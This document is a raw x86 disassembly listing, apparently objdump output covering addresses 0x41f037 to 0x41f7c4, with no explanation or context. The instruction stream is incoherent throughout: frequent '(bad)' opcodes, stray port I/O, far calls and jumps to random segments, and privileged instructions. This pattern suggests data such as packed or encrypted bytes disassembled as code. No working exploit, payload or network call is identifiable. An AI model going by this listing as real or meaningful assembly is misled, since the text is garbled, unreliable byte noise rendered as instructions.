  41f037:	aad    0x93
  41f039:	jg     0x41f077
  41f03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f03d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f03e:	es add edi,ecx
  41f041:	inc    edi
  41f042:	aas    
  41f043:	pop    ebp
  41f044:	rcr    bl,0x7b
  41f047:	mov    bh,0xc6
  41f049:	test   DWORD PTR [ebx],ecx
  41f04b:	pushf  
  41f04c:	cmp    al,bl
  41f04e:	in     eax,0x64
  41f050:	daa    
  41f051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f052:	push   edx
  41f053:	jo     0x41f0d0
  41f055:	and    al,dl
  41f057:	(bad)  [ebx]
  41f059:	dec    esi
  41f05a:	ror    DWORD PTR [edi+edx*4+0x5f],1
  41f05e:	sbb    eax,0xff235405
  41f063:	pushf  
  41f064:	not    bl
  41f066:	pop    ecx
  41f067:	adc    eax,0x9421f0eb
  41f06c:	sti    
  41f06d:	lahf   
  41f06e:	cmp    eax,0xeb3726fd
  41f073:	pop    ss
  41f074:	xor    eax,ecx
  41f076:	imul   esp,DWORD PTR [eax-0x27492ae3],0x3ddd30f7
  41f080:	inc    edx
  41f081:	ret    
  41f082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f083:	outs   dx,BYTE PTR ds:[esi]
  41f084:	mov    esi,0x680c387b
  41f089:	mov    ch,0xed
  41f08b:	inc    esp
  41f08c:	xor    esp,edi
  41f08e:	sbb    DWORD PTR [esi+ebx*8],edi
  41f091:	pusha  
  41f092:	out    0x71,al
  41f094:	xchg   esp,ecx
  41f096:	call   0x3726:0x8cbf1138
  41f09d:	cwde   
  41f09e:	inc    edi
  41f09f:	pop    eax
  41f0a0:	adc    al,0x46
  41f0a3:	int3   
  41f0a4:	or     DWORD PTR [edi],ecx
  41f0a6:	leave  
  41f0a7:	push   ss
  41f0a8:	inc    esi
  41f0a9:	or     BYTE PTR [ebp-0x28],ah
  41f0ac:	xchg   edx,esp
  41f0ae:	js     0x41f086
  41f0b0:	nop
  41f0b1:	mov    edi,0x149806f2
  41f0b6:	jmp    0x9cc15b3
  41f0bb:	fisubr DWORD PTR [ebp+0x69]
  41f0be:	pop    es
  41f0bf:	dec    ebp
  41f0c0:	push   ecx
  41f0c1:	jge    0x41f116
  41f0c3:	fidivr DWORD PTR [esi-0x27]
  41f0c6:	fcmovbe st,st(4)
  41f0c8:	pop    edi
  41f0c9:	addr16 cmc 
  41f0cb:	inc    edi
  41f0cc:	mov    edx,DWORD PTR [edx]
  41f0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cf:	test   eax,0xf8638e7c
  41f0d4:	inc    edi
  41f0d5:	out    0xd0,eax
  41f0d7:	sbb    BYTE PTR [edi-0x25],dh
  41f0da:	and    ebx,DWORD PTR [eax+0x33]
  41f0dd:	or     al,0xb7
  41f0df:	xor    DWORD PTR [esi+ebp*2-0x551b3da2],edx
  41f0e6:	or     DWORD PTR [edx+0x4a],edx
  41f0e9:	loopne 0x41f13f
  41f0eb:	push   ds
  41f0ec:	xlat   BYTE PTR ds:[ebx]
  41f0ed:	mov    edx,DWORD PTR [edx+0x2e]
  41f0f0:	adc    eax,0x7b27eeef
  41f0f5:	pop    edi
  41f0f6:	and    al,0x77
  41f0f8:	retf   0x3237
  41f0fb:	mov    cl,0xdc
  41f0fd:	pop    edi
  41f0fe:	pop    eax
  41f0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f100:	stos   DWORD PTR es:[edi],eax
  41f101:	iret   
  41f102:	shl    DWORD PTR [edx+0x49e3a39f],1
  41f108:	pop    edx
  41f109:	cmp    bl,BYTE PTR [edi+0x689928ec]
  41f10f:	and    BYTE PTR [eax],0xde
  41f112:	dec    esp
  41f113:	dec    edx
  41f114:	nop
  41f115:	add    al,0x88
  41f117:	loop   0x41f17d
  41f119:	scas   al,BYTE PTR es:[edi]
  41f11a:	dec    edi
  41f11b:	rol    DWORD PTR [esi+eiz*4-0x12a100a4],cl
  41f122:	sub    bh,bl
  41f124:	daa    
  41f125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f126:	push   0x9844e5c8
  41f12b:	sub    eax,0xdb95aa6
  41f130:	scas   al,BYTE PTR es:[edi]
  41f131:	(bad)  
  41f132:	lods   al,BYTE PTR ds:[esi]
  41f133:	stc    
  41f134:	cmp    eax,DWORD PTR [ebx-0x68]
  41f137:	cld    
  41f138:	jle    0x41f100
  41f13a:	sub    edx,0xffffff80
  41f13d:	das    
  41f13e:	dec    esp
  41f13f:	outs   dx,DWORD PTR ds:[esi]
  41f140:	and    esp,DWORD PTR [ebx-0x2ac7037b]
  41f146:	sbb    BYTE PTR [ecx+0x70df17b7],cl
  41f14c:	mov    BYTE PTR [ebp+eiz*2-0x28],ch
  41f150:	jns    0x41f1b7
  41f152:	jmp    0x41f15e
  41f154:	cld    
  41f155:	fs xchg esp,eax
  41f157:	pop    esi
  41f158:	and    ah,BYTE PTR [esp+ebp*8]
  41f15b:	retf   0x2b2f
  41f15e:	xor    BYTE PTR [esi-0x4175b9ad],al
  41f164:	sub    ecx,DWORD PTR ds:0x11424627
  41f16a:	cwde   
  41f16b:	out    dx,eax
  41f16c:	shl    DWORD PTR [esi],1
  41f16e:	add    al,0xdd
  41f170:	lods   eax,DWORD PTR ds:[esi]
  41f171:	add    eax,0xa88b0b3b
  41f176:	cmp    BYTE PTR [eax],0x30
  41f179:	out    dx,al
  41f17a:	and    eax,0xe8c9e347
  41f17f:	jae    0x41f1ea
  41f181:	(bad)  
  41f182:	into   
  41f183:	push   esi
  41f184:	inc    edi
  41f185:	pushf  
  41f186:	pop    es
  41f187:	loope  0x41f15f
  41f189:	out    dx,eax
  41f18a:	inc    edi
  41f18b:	pop    ss
  41f18c:	aad    0x6f
  41f18e:	jge    0x41f156
  41f190:	popa   
  41f191:	repz js 0x41f204
  41f194:	sar    DWORD PTR [eax],0x5d
  41f197:	fmul   QWORD PTR [ecx]
  41f199:	dec    ecx
  41f19a:	sbb    al,0xf
  41f19c:	clc    
  41f19d:	fwait
  41f19e:	shl    BYTE PTR [eax+0x33af1dc3],cl
  41f1a4:	pop    edi
  41f1a5:	add    DWORD PTR [edx],ebx
  41f1a7:	dec    esp
  41f1a8:	fmul   QWORD PTR [eax]
  41f1aa:	and    ecx,0x2e49817e
  41f1b0:	lahf   
  41f1b1:	dec    ecx
  41f1b2:	or     ebx,DWORD PTR [ebp-0x86ef282]
  41f1b8:	mov    ebp,ecx
  41f1ba:	iret   
  41f1bb:	and    ebx,edi
  41f1bd:	cmp    eax,0x9f929461
  41f1c2:	pop    ebp
  41f1c3:	ss loopne 0x41f193
  41f1c6:	mov    cl,0x45
  41f1c8:	(bad)  
  41f1ca:	in     al,dx
  41f1cb:	dec    eax
  41f1cc:	enter  0x174b,0xfa
  41f1d0:	mov    ecx,0xcda074b1
  41f1d5:	(bad)  
  41f1d6:	mov    esp,0xf0967d4c
  41f1db:	mov    esp,0x54945371
  41f1e0:	(bad)  
  41f1e1:	pop    ds
  41f1e2:	jbe    0x41f244
  41f1e4:	cli    
  41f1e5:	int3   
  41f1e6:	mov    dl,0x81
  41f1e8:	mov    eax,0xd4330c37
  41f1ed:	mov    dh,0xb
  41f1ef:	shl    DWORD PTR [ebx],0xc2
  41f1f2:	inc    edi
  41f1f3:	ss test al,0x7f
  41f1f6:	out    dx,eax
  41f1f7:	add    BYTE PTR [edi+0x8a393b3],cl
  41f1fd:	add    dl,ch
  41f1ff:	push   edi
  41f200:	leave  
  41f201:	das    
  41f202:	pop    ebx
  41f203:	jp     0x41f1b3
  41f205:	jg     0x41f1e7
  41f207:	jge    0x41f1f3
  41f209:	sub    al,BYTE PTR ds:[ebx]
  41f20c:	dec    ebp
  41f20d:	iret   
  41f20e:	sbb    BYTE PTR [eax],dl
  41f210:	test   DWORD PTR [edi-0x5c],0x627be7f0
  41f217:	lds    ecx,FWORD PTR [esi]
  41f219:	adc    al,0x7b
  41f21b:	xchg   ebp,eax
  41f21c:	dec    edx
  41f21d:	neg    BYTE PTR [esi]
  41f21f:	mov    cl,0xaf
  41f221:	add    dh,BYTE PTR [ebx+0x3ce36eb]
  41f227:	sub    DWORD PTR [ecx-0x527f533d],esp
  41f22d:	inc    ecx
  41f22e:	jecxz  0x41f283
  41f230:	xchg   ecx,eax
  41f231:	mov    esp,0xb2567836
  41f236:	outs   dx,BYTE PTR ds:[esi]
  41f237:	fistp  QWORD PTR [ebx+eax*2+0x208dbcff]
  41f23e:	scas   al,BYTE PTR es:[edi]
  41f23f:	shl    BYTE PTR [edx-0x1e],1
  41f242:	icebp  
  41f243:	(bad)  
  41f244:	jns    0x41f22e
  41f246:	popa   
  41f247:	add    DWORD PTR [ebx],esi
  41f249:	sub    BYTE PTR [ebp-0x62],0x45
  41f24d:	xchg   edx,eax
  41f24e:	sub    DWORD PTR [esp+ecx*1],eax
  41f251:	jno    0x41f238
  41f253:	lock call 0x9d07e6ac
  41f259:	xor    BYTE PTR [edi-0x44],bh
  41f25c:	cmp    al,0x33
  41f25e:	cmp    al,BYTE PTR [ebx]
  41f260:	jg     0x41f2d3
  41f262:	or     eax,0x12a5e146
  41f267:	sub    DWORD PTR [esp+ebx*8+0x571d7e0a],ecx
  41f26e:	js     0x41f25a
  41f270:	push   0x27
  41f272:	xchg   DWORD PTR [eax+0x47],esp
  41f275:	add    esi,DWORD PTR [ebp+0x27e7729]
  41f27b:	dec    esi
  41f27c:	scas   eax,DWORD PTR es:[edi]
  41f27d:	mov    cl,0xb4
  41f27f:	lods   al,BYTE PTR ds:[esi]
  41f280:	shr    BYTE PTR [eax+0x57],cl
  41f283:	sbb    eax,0x4e1bc969
  41f288:	dec    edi
  41f289:	leave  
  41f28a:	and    dh,BYTE PTR [eax]
  41f28c:	cli    
  41f28d:	or     BYTE PTR [esi+0x49],al
  41f290:	jmp    DWORD PTR [ecx-0x5a]
  41f293:	cmp    esp,ebp
  41f295:	lock mov DWORD PTR [ebp-0x27bfb542],edi
  41f29c:	xchg   edi,eax
  41f29d:	sub    ebx,DWORD PTR [ecx+eiz*2-0x18c3384]
  41f2a4:	shr    BYTE PTR [esi-0x2e],0x4a
  41f2a8:	jge    0x41f280
  41f2aa:	call   0xcb962cca
  41f2af:	not    dh
  41f2b1:	(bad)  
  41f2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2b3:	or     dl,BYTE PTR [esi+0x28d4d44c]
  41f2b9:	dec    BYTE PTR [edi]
  41f2bb:	mov    edi,0x7a68d361
  41f2c0:	pandn  mm3,QWORD PTR [esi]
  41f2c3:	stos   DWORD PTR es:[edi],eax
  41f2c4:	or     ebx,eax
  41f2c6:	inc    ebp
  41f2c7:	loop   0x41f2c7
  41f2c9:	pand   mm5,mm7
  41f2cc:	addr16 push 0x220217f9
  41f2d2:	mov    BYTE PTR [esp+ecx*4+0x1c],bh
  41f2d6:	sub    eax,0x174fa135
  41f2db:	adc    eax,DWORD PTR [edx]
  41f2dd:	add    eax,0xeb16f15d
  41f2e2:	mov    ecx,DWORD PTR [edi+0x67e4ff94]
  41f2e8:	cmc    
  41f2e9:	inc    esp
  41f2eb:	xor    ch,cl
  41f2ed:	inc    edi
  41f2ee:	mov    eax,0xd98fe151
  41f2f3:	test   al,0xf0
  41f2f5:	dec    esp
  41f2f6:	dec    edx
  41f2f7:	cld    
  41f2f8:	cmp    al,0x7b
  41f2fa:	test   DWORD PTR [eax-0x6e4eed4d],edx
  41f300:	test   eax,0x5cd129f1
  41f305:	test   al,0xb8
  41f307:	pusha  
  41f308:	and    al,BYTE PTR [ebx+0xf]
  41f30b:	sbb    ebp,DWORD PTR [ebp+0x54]
  41f30e:	shr    DWORD PTR [esi],0x35
  41f311:	mov    ebp,0x277c48de
  41f316:	push   cs
  41f317:	sar    BYTE PTR [esp],cl
  41f31a:	sbb    esi,ecx
  41f31c:	cmp    ebp,ecx
  41f31e:	and    eax,0x77455d0a
  41f323:	mov    eax,ds:0x1464911a
  41f328:	mov    ah,0x58
  41f32a:	mov    ah,0x8a
  41f32c:	ret    
  41f32d:	dec    ecx
  41f32e:	xchg   ebp,eax
  41f32f:	cmp    ch,BYTE PTR [esi-0x4d40e885]
  41f335:	inc    edx
  41f336:	and    eax,0x6a030dd6
  41f33b:	repz inc eax
  41f33d:	fs ds js 0x41f365
  41f341:	jg     0x41f2e9
  41f343:	inc    ebp
  41f344:	add    DWORD PTR [edx+0x12],esi
  41f347:	imul   ebp,DWORD PTR [eax-0xd9db47],0x18f9d2dd
  41f351:	out    0x7e,eax
  41f353:	xchg   esp,eax
  41f354:	jmp    0x41f32f
  41f356:	nop
  41f357:	xchg   BYTE PTR [edi+eiz*8-0x7a],bh
  41f35b:	int3   
  41f35c:	lds    edx,FWORD PTR [ebx+0x52498655]
  41f362:	js     0x41f332
  41f364:	xor    eax,0x769e6c61
  41f369:	or     esp,DWORD PTR [eax+0x3f]
  41f36c:	sbb    BYTE PTR [ebp-0x765a1b42],cl
  41f372:	js     0x41f3bb
  41f374:	push   cs
  41f375:	xor    ah,bl
  41f377:	wbinvd 
  41f379:	add    eax,0x3d12c88a
  41f37e:	cld    
  41f37f:	jmp    0xd9516a4
  41f384:	xchg   edx,eax
  41f385:	pop    edi
  41f386:	xor    DWORD PTR [edx+0x4b],esi
  41f389:	jmp    0x24764efc
  41f38e:	push   ecx
  41f38f:	fs xchg ecx,eax
  41f391:	xchg   ebp,eax
  41f392:	sbb    eax,0x96bfd37d
  41f397:	fsubr  DWORD PTR [ebx]
  41f399:	sbb    ebp,esi
  41f39b:	ret    0x58e7
  41f39e:	mov    dl,0x8d
  41f3a0:	xchg   ebp,eax
  41f3a1:	sub    ah,ah
  41f3a3:	adc    al,0xdc
  41f3a5:	cdq    
  41f3a6:	add    edx,edi
  41f3a8:	or     al,0x95
  41f3aa:	sbb    DWORD PTR [eax+0x498ee831],esp
  41f3b0:	(bad)  
  41f3b1:	enter  0xbd92,0x41
  41f3b5:	mov    ds:0xaae78f5f,eax
  41f3ba:	or     BYTE PTR [ecx+0x65d53115],0xe7
  41f3c1:	pop    esi
  41f3c2:	popa   
  41f3c3:	inc    esp
  41f3c4:	(bad)  
  41f3c6:	(bad)  
  41f3c7:	addr16 push 0x9b2b099f
  41f3cd:	aas    
  41f3ce:	ss pop ecx
  41f3d0:	cdq    
  41f3d1:	cmp    eax,0x69d76646
  41f3d6:	cmp    DWORD PTR [esi+ecx*2-0x7a],ebx
  41f3da:	stc    
  41f3db:	loopne 0x41f37b
  41f3dd:	nop
  41f3de:	mov    al,ds:0x656396c5
  41f3e3:	gs xor al,0xbc
  41f3e6:	cmp    dl,BYTE PTR [esp+edx*1]
  41f3e9:	ror    dl,cl
  41f3eb:	stos   BYTE PTR es:[edi],al
  41f3ec:	inc    DWORD PTR [esi-0x402c5ea9]
  41f3f2:	fld    st(1)
  41f3f4:	cmp    ah,BYTE PTR [ecx]
  41f3f6:	loope  0x41f39b
  41f3f8:	daa    
  41f3f9:	jmp    0x953d:0xfa3bc990
  41f400:	popa   
  41f401:	sbb    DWORD PTR [edx-0x4a],ecx
  41f404:	add    bh,al
  41f406:	outs   dx,DWORD PTR ds:[esi]
  41f407:	daa    
  41f408:	dec    esi
  41f409:	add    eax,0xe1af107
  41f40e:	adc    ch,BYTE PTR [edx-0x4c]
  41f411:	adc    ecx,ecx
  41f413:	pusha  
  41f414:	push   eax
  41f415:	bound  ebx,QWORD PTR [eax]
  41f417:	les    ebx,FWORD PTR [ebx+eax*4+0x2f55b569]
  41f41e:	xchg   DWORD PTR [esi-0x41],ebx
  41f421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f422:	frstor [ebx-0x4d3e062c]
  41f428:	sbb    eax,DWORD PTR [ebx-0x3dbf04c3]
  41f42e:	in     al,0x52
  41f430:	push   0x44
  41f432:	lods   al,BYTE PTR ds:[esi]
  41f433:	sbb    esp,DWORD PTR [eax-0x57]
  41f436:	(bad)  
  41f438:	dec    ebp
  41f439:	stc    
  41f43a:	jbe    0x41f4a7
  41f43c:	sub    al,0xdb
  41f43e:	out    0xba,al
  41f440:	ror    BYTE PTR [eax],1
  41f442:	pop    ss
  41f443:	test   ch,bl
  41f445:	cs add eax,0x9c9fbb79
  41f44b:	add    BYTE PTR [ecx+0x61e4aa61],ch
  41f451:	xchg   BYTE PTR [edx],bh
  41f453:	nop
  41f454:	jns    0x41f458
  41f456:	fist   WORD PTR [ebx+0x6829aca9]
  41f45c:	jp     0x41f437
  41f45e:	jmp    0x63bee4ab
  41f463:	cmp    BYTE PTR [edi-0x64aef4ea],al
  41f469:	dec    ebx
  41f46a:	sub    edi,DWORD PTR [edi+0x0]
  41f46d:	xchg   esi,eax
  41f46e:	push   es
  41f46f:	stc    
  41f470:	or     ch,bl
  41f472:	or     eax,esp
  41f474:	in     al,dx
  41f475:	mov    esp,0xc8068420
  41f47a:	jnp    0x41f453
  41f47c:	sbb    al,BYTE PTR [edi+ebx*2+0x5e]
  41f480:	out    0x71,al
  41f482:	sub    eax,0xd640c4b7
  41f487:	bound  esi,QWORD PTR [ebx+ebx*2+0x3d2023c9]
  41f48e:	std    
  41f48f:	inc    esi
  41f490:	and    BYTE PTR [ebx+0x38a07521],dl
  41f496:	out    dx,al
  41f497:	mov    eax,0xdd31ab79
  41f49c:	lock jno 0x41f442
  41f49f:	aaa    
  41f4a0:	mov    edi,0x96fca1e6
  41f4a5:	std    
  41f4a6:	push   edx
  41f4a7:	test   edi,esp
  41f4a9:	jecxz  0x41f4fa
  41f4ab:	jl     0x41f4a6
  41f4ad:	outs   dx,BYTE PTR ds:[esi]
  41f4ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4af:	mov    al,0x53
  41f4b1:	es call 0xbf60:0x4fd30dcd
  41f4b9:	adc    ah,al
  41f4bb:	jmp    0xa88e2278
  41f4c0:	adc    bh,dl
  41f4c2:	cmp    ch,bh
  41f4c4:	pushf  
  41f4c5:	xor    BYTE PTR [edi],bl
  41f4c7:	adc    eax,0x1370497c
  41f4cc:	lahf   
  41f4cd:	pop    ebx
  41f4ce:	cmp    eax,0x8bfd563b
  41f4d3:	or     eax,0x5537a0d1
  41f4d8:	xchg   DWORD PTR [edi],ebx
  41f4da:	and    eax,0x24685383
  41f4df:	ins    BYTE PTR es:[edi],dx
  41f4e0:	jle    0x41f4d1
  41f4e2:	jb     0x41f528
  41f4e4:	pop    esi
  41f4e5:	std    
  41f4e6:	adc    BYTE PTR [esi+0x78],0x6e
  41f4ea:	xchg   al,dh
  41f4ec:	xchg   ecx,eax
  41f4ed:	xor    edi,DWORD PTR [ebx+0x65]
  41f4f0:	jo     0x41f515
  41f4f2:	lea    esi,[edi+0x7cfe1457]
  41f4f8:	sbb    BYTE PTR [ecx],0x24
  41f4fb:	xchg   edx,eax
  41f4fc:	mov    esp,0xb3972da9
  41f501:	jb     0x41f488
  41f503:	inc    edi
  41f504:	jle    0x41f566
  41f506:	cwde   
  41f507:	popa   
  41f508:	mov    al,ds:0x424c4d54
  41f50d:	pop    edx
  41f50e:	in     eax,0x82
  41f510:	inc    ecx
  41f511:	cmc    
  41f512:	or     al,0x46
  41f514:	(bad)
  41f518:	push   edi
  41f51a:	pop    ds
  41f51b:	push   ecx
  41f51c:	or     cl,dh
  41f51e:	fisttp WORD PTR [eax+0x58]
  41f521:	cmp    DWORD PTR [ebx],ebx
  41f523:	ret    0x8270
  41f526:	inc    esp
  41f527:	dec    ebp
  41f528:	out    dx,al
  41f529:	push   ecx
  41f52a:	cmp    BYTE PTR [edi],bh
  41f52c:	mov    ds:0xe365a1c9,eax
  41f531:	mov    dl,BYTE PTR ds:0x33e1087b
  41f537:	fwait
  41f538:	cli    
  41f539:	les    edi,FWORD PTR [eax+edx*8+0x19]
  41f53d:	test   BYTE PTR [edx+0x26],0x88
  41f541:	shr    BYTE PTR [esp+esi*1+0x35],cl
  41f545:	test   BYTE PTR [ebx-0x82cf289],cl
  41f54b:	stc    
  41f54c:	or     dl,BYTE PTR [edi+0x42d0774f]
  41f552:	pop    ebx
  41f553:	xor    BYTE PTR [edi+0x12],dh
  41f556:	cmp    DWORD PTR [esi],eax
  41f558:	inc    ebx
  41f559:	cmp    DWORD PTR [edx],edx
  41f55b:	push   esi
  41f55c:	jae    0x41f598
  41f55e:	xor    BYTE PTR [ebx],ch
  41f560:	inc    ebx
  41f561:	xchg   ebp,eax
  41f562:	xchg   ebx,eax
  41f563:	xor    edx,DWORD PTR ds:[ebx-0x7b]
  41f567:	mov    eax,0x5ad97a7c
  41f56c:	sahf   
  41f56d:	not    DWORD PTR [eax+eax*2-0x60b23974]
  41f574:	dec    ebp
  41f575:	push   es
  41f576:	mov    al,0x54
  41f578:	mov    ah,0xd1
  41f57a:	xchg   edx,eax
  41f57b:	ficomp WORD PTR [ecx]
  41f57d:	sbb    BYTE PTR [ecx+0xb],dh
  41f580:	add    eax,0xffdec9b5
  41f585:	sbb    eax,0xb2a51d3f
  41f58a:	inc    esi
  41f58b:	inc    edx
  41f58c:	cmp    bh,BYTE PTR [ebx+ebp*8]
  41f58f:	inc    esp
  41f590:	mov    dl,0x9d
  41f592:	mov    ah,0xbd
  41f594:	ja     0x41f5ea
  41f596:	xchg   esi,eax
  41f597:	xor    DWORD PTR [ebp+0x10b20859],esi
  41f59d:	nop
  41f59e:	test   eax,0x5cae2ce3
  41f5a3:	ss popw es
  41f5a6:	xor    DWORD PTR [edx],0x7c
  41f5a9:	call   0xb134:0x3c940324
  41f5b0:	(bad)  
  41f5b1:	test   BYTE PTR [ecx-0x1be4bdf5],bh
  41f5b7:	xchg   ecx,eax
  41f5b8:	xchg   ebx,eax
  41f5b9:	ret    0xc95f
  41f5bc:	mov    cl,0x2b
  41f5be:	jp     0x41f635
  41f5c0:	pop    eax
  41f5c1:	mov    eax,ds:0xcfcd4962
  41f5c6:	ss push es
  41f5c8:	loop   0x41f62e
  41f5ca:	or     BYTE PTR [edx+0x5fa9160f],ah
  41f5d0:	cli    
  41f5d1:	int3   
  41f5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d3:	aad    0xb1
  41f5d5:	mov    ebx,0xe21e620b
  41f5da:	pop    esp
  41f5db:	test   DWORD PTR [edx+0x37],0xc5541d30
  41f5e2:	cmp    al,0xaf
  41f5e4:	(bad)  
  41f5e5:	sbb    DWORD PTR ds:0x8b6b2cf3,edi
  41f5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5ec:	sub    al,0xb0
  41f5ee:	dec    ebp
  41f5ef:	in     al,0xfa
  41f5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5f2:	outs   dx,DWORD PTR ds:[esi]
  41f5f3:	arpl   WORD PTR [eax-0x6d15137d],sp
  41f5f9:	fdivr  DWORD PTR [esp+eax*2]
  41f5fc:	pop    ds
  41f5fd:	fs or  eax,esp
  41f600:	inc    DWORD PTR [ebx+0x49a98f50]
  41f606:	aad    0xdc
  41f608:	idiv   DWORD PTR [edi-0x20247bf0]
  41f60e:	retf   
  41f60f:	push   ecx
  41f610:	mov    al,ds:0xf977d0ff
  41f615:	lods   eax,DWORD PTR ds:[esi]
  41f616:	addr16 jl 0x41f5e0
  41f619:	repz xchg ebx,eax
  41f61b:	fs mov cl,0x85
  41f61e:	(bad)  
  41f620:	test   al,0xfa
  41f622:	out    0xaf,eax
  41f624:	mov    ch,bl
  41f626:	cmp    al,0xd2
  41f628:	cwde   
  41f629:	mov    ch,0x40
  41f62b:	dec    eax
  41f62c:	aad    0xa7
  41f62e:	pop    edx
  41f62f:	sbb    BYTE PTR [ebp+0x10a5b1b3],dh
  41f635:	sti    
  41f636:	fwait
  41f637:	xor    BYTE PTR [ebx-0x239c4e0e],ch
  41f63d:	dec    edi
  41f63e:	push   ebx
  41f63f:	in     eax,dx
  41f640:	(bad)  [eax]
  41f642:	inc    esp
  41f643:	jns    0x41f68a
  41f645:	arpl   bp,ax
  41f647:	jmp    0xb988:0x91e5252e
  41f64e:	imul   edx,DWORD PTR [ecx],0x43dcb013
  41f654:	ret    0xf505
  41f657:	adc    al,bl
  41f659:	clc    
  41f65a:	ds loop 0x41f610
  41f65d:	out    0x6d,al
  41f65f:	push   edx
  41f660:	cli    
  41f661:	imul   ebx,DWORD PTR [edi+0x50],0x9abf7f83
  41f668:	jmp    0x41f624
  41f66a:	push   ecx
  41f66b:	cmp    esi,DWORD PTR [ecx+0x3ca77589]
  41f671:	push   0xb8006068
  41f676:	loopne 0x41f6e5
  41f678:	or     BYTE PTR [ebx+0x11cc284a],bl
  41f67e:	or     eax,0xaa3c6a75
  41f683:	dec    esp
  41f684:	xchg   ebx,eax
  41f685:	or     DWORD PTR [edi+0x76],ecx
  41f688:	mov    ebp,0xe06a91d
  41f68d:	sar    BYTE PTR [esi+edi*2-0x2052ecc0],1
  41f694:	xchg   edi,eax
  41f695:	mov    ch,0xb0
  41f697:	pop    es
  41f698:	mov    esi,0xd4af8278
  41f69d:	iret   
  41f69e:	mov    ch,0xa3
  41f6a0:	mov    ebp,0xe2c27690
  41f6a5:	cwde   
  41f6a6:	dec    eax
  41f6a7:	dec    edx
  41f6a8:	jo     0x41f6cf
  41f6aa:	addr16 mov ebp,0xb75e1081
  41f6b0:	stos   BYTE PTR es:[edi],al
  41f6b1:	mov    eax,0x47574ecf
  41f6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b7:	mov    esp,0xab96f87c
  41f6bc:	and    BYTE PTR ds:0xcf144105,cl
  41f6c2:	fsubr  QWORD PTR [ebp+edi*8+0x28]
  41f6c6:	inc    ebp
  41f6c7:	sub    ebp,DWORD PTR [esi]
  41f6c9:	dec    edi
  41f6ca:	and    al,0x74
  41f6cc:	fcmovnb st,st(3)
  41f6ce:	mov    BYTE PTR [eax-0x67],bl
  41f6d1:	inc    eax
  41f6d2:	popf   
  41f6d3:	jl     0x41f6d7
  41f6d5:	xchg   ebx,eax
  41f6d6:	add    BYTE PTR [ecx+edx*2+0x60],cl
  41f6da:	mov    eax,0xc9df2dd4
  41f6df:	mov    bl,0xf
  41f6e1:	pop    es
  41f6e2:	mov    ds:0xe1695e7f,eax
  41f6e7:	or     ebx,esi
  41f6e9:	adc    al,0x46
  41f6eb:	sahf   
  41f6ec:	adc    BYTE PTR [esi],dh
  41f6ee:	mov    edx,0x6a9a849f
  41f6f3:	mov    bl,0xa0
  41f6f5:	(bad)  
  41f6f6:	fbstp  TBYTE PTR gs:[esi-0x6]
  41f6fa:	cld    
  41f6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6fc:	pushf  
  41f6fd:	and    DWORD PTR [edi],0xffffffd7
  41f700:	jno    0x41f6a3
  41f702:	push   0xca17ad50
  41f707:	dec    ebx
  41f708:	mov    BYTE PTR [ecx-0x578a91f6],bl
  41f70e:	test   eax,0xd0ebc1b9
  41f713:	jo     0x41f74a
  41f715:	clc    
  41f716:	(bad)  
  41f718:	out    0xb4,al
  41f71a:	scas   al,BYTE PTR es:[di]
  41f71c:	dec    edi
  41f71d:	jp     0x41f71d
  41f71f:	push   es
  41f720:	aas    
  41f721:	ret    
  41f722:	test   eax,0xbf49639d
  41f727:	add    edx,DWORD PTR [edi]
  41f729:	enter  0x589,0x51
  41f72d:	rcl    DWORD PTR [ecx+0x5b],0x3b
  41f731:	in     eax,0x87
  41f733:	pop    esi
  41f734:	and    BYTE PTR [ecx+ebx*1],0x19
  41f738:	data16 mov al,ds:0x7c791bc3
  41f73e:	sar    DWORD PTR [ebp-0x45],cl
  41f741:	call   0x1db1:0x2fb023ef
  41f748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f749:	je     0x41f7c2
  41f74b:	sub    DWORD PTR [esi+0x4751e42a],0x2
  41f752:	repnz adc esi,DWORD PTR [eax]
  41f755:	push   edi
  41f756:	xlat   BYTE PTR ds:[ebx]
  41f757:	cdq    
  41f758:	call   0xf14f5a97
  41f75d:	shl    cl,1
  41f75f:	addr16 daa 
  41f761:	push   0x81b900c5
  41f766:	int    0xef
  41f768:	test   DWORD PTR [ecx+0xc],eax
  41f76b:	lahf   
  41f76c:	and    eax,0x60ba8f70
  41f771:	ins    DWORD PTR es:[edi],dx
  41f772:	cmp    eax,0x8ef27851
  41f777:	ds mov ah,0x3f
  41f77a:	fcmovne st,st(7)
  41f77c:	es add dl,BYTE PTR cs:[esi]
  41f780:	mov    edi,0x6111bf52
  41f785:	dec    ebp
  41f786:	xchg   esp,edi
  41f788:	push   esp
  41f789:	lods   eax,DWORD PTR ds:[esi]
  41f78a:	mov    esi,0x7d38c298
  41f78f:	mov    bl,0x7f
  41f791:	outs   dx,BYTE PTR ds:[esi]
  41f792:	or     al,0x4c
  41f794:	rcl    DWORD PTR cs:[edx+0xc08449],1
  41f79b:	jle    0x41f80e
  41f79d:	jmp    0xdf7c4f4b
  41f7a2:	fdiv   st,st(2)
  41f7a4:	pop    esp
  41f7a5:	in     eax,0xbb
  41f7a7:	test   al,0xb2
  41f7a9:	shl    BYTE PTR [eax-0x4eed75a1],1
  41f7af:	xchg   edi,eax
  41f7b0:	sub    al,0xcf
  41f7b2:	aad    0x13
  41f7b4:	test   eax,0x83985709
  41f7b9:	pushf  
  41f7ba:	adc    ah,BYTE PTR es:[esi]
  41f7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7be:	mul    DWORD PTR [edi-0x5b5754a]
  41f7c4:	fadd   st,st(3)
